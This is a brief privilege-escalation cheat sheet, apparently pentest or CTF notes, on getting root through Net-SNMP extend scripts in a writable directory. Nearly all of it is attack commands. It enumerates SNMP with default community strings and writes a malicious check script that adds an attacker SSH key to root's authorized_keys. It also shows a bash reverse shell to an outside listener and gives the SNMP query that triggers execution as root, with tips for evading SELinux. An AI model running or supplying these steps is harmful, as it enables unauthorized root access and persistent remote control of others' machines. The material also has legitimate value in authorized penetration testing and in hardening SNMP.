# SNMP Extend Script Write Root Execution

Net-SNMP's `NET-SNMP-EXTEND-MIB` allows admins to define scripts that run when the OID is queried. If the script directory is writable (via ACL or group membership), writing a `check*.sh` script and triggering SNMP causes execution as root (the snmpd daemon user, typically root).

## Identify via SNMP Enumeration

```bash
# Dump SNMP with community string "public"
snmpwalk -v1 -c public <TARGET> NET-SNMP-EXTEND-MIB::nsExtendObjects

# Look for:
# NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
```

## Check Script Directory Permissions (ACL)

```bash
# If you have shell access, check ACL on the script directory
getfacl /usr/local/monitoring
# Look for: user:<youruser>:-wx  (write + execute without read)
```

## Write Malicious Script

```bash
# Write script to add SSH key to root
echo 'echo "ssh-ed25519 <YOUR_PUBKEY>" >> /root/.ssh/authorized_keys' \
  > /usr/local/monitoring/check_shell.sh

# Or create a reverse shell
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' \
  > /usr/local/monitoring/check_shell.sh
```

## Trigger Execution via SNMP

```bash
# Query the monitoring OID to trigger script execution
snmpwalk -v1 -c public <TARGET> NET-SNMP-EXTEND-MIB::nsExtendObjects

# View output
# NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: ...
```

## Notes
- SNMP community string: try "public", "private", "internal"
- Script naming: must match pattern used in the monitor script (e.g., `check*.sh`)
- snmpd typically runs as root; scripts execute with root privileges
- SELinux may restrict outbound connections from snmpd context — use SSH key injection instead
- Verify write access: `ls -la /usr/local/monitoring/` (may show permission denied but ACL allows write)
